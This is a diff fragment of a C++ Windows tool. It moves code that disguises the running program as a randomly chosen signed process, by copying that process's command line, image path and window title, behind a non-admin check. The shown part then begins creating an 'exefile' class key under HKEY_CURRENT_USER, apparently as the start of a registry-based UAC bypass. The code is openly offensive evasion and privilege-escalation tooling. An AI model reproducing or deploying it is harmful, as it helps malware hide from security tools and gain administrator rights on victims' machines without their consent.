@@ -6,35 +6,35 @@ using namespace std;
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                      LPSTR lpCmdLine, int nCmdShow) {
-  if (!InitNtdll()) {
-    fprintf(stderr, "[-] Failed to resolve NtQueryInformationProcess.\n");
-    return 1;
-  }
-
-  // Pick a random signed process to masquerade as.
-  SignedProcessInfo target = PickRandomSignedProcess();
-  if (target.pid == 0) {
-    fprintf(stderr, "[-] No signed process found to impersonate.\n");
-    return 1;
-  }
-  printf("[+] Selected process: %ws (PID %lu)\n\n", target.exeName.c_str(), target.pid);
-
-  // Read info from the target.
-  ProcessStrings info;
-  if (!ReadRemoteProcessStrings(target.pid, info)) {
-    fprintf(stderr, "[-] Failed to read process strings.\n");
-    return 1;
-  }
-
-  printf("[*] Read from target process:\n");
-  printf("    CommandLine   : %ws\n", info.commandLine.c_str());
-  printf("    ImagePathName : %ws\n", info.imagePathName.c_str());
-  printf("    WindowTitle   : %ws\n\n", info.windowTitle.c_str());
-
-  // Apply to ourselves.
-  ApplyToCurrentProcess(info);
-
   if (!IsUserAnAdmin()) {
+    if (!InitNtdll()) {
+      fprintf(stderr, "[-] Failed to resolve NtQueryInformationProcess.\n");
+      return 1;
+    }
+
+    // Pick a random signed process to masquerade as.
+    SignedProcessInfo target = PickRandomSignedProcess();
+    if (target.pid == 0) {
+      fprintf(stderr, "[-] No signed process found to impersonate.\n");
+      return 1;
+    }
+    printf("[+] Selected process: %ws (PID %lu)\n\n", target.exeName.c_str(), target.pid);
+
+    // Read info from the target.
+    ProcessStrings info;
+    if (!ReadRemoteProcessStrings(target.pid, info)) {
+      fprintf(stderr, "[-] Failed to read process strings.\n");
+      return 1;
+    }
+
+    printf("[*] Read from target process:\n");
+    printf("    CommandLine   : %ws\n", info.commandLine.c_str());
+    printf("    ImagePathName : %ws\n", info.imagePathName.c_str());
+    printf("    WindowTitle   : %ws\n\n", info.windowTitle.c_str());
+
+    // Apply to ourselves.
+    ApplyToCurrentProcess(info);
+  
     // Create Class "exefile" in HKCU
     // HKEY_CURRENT_USER
     //   Software
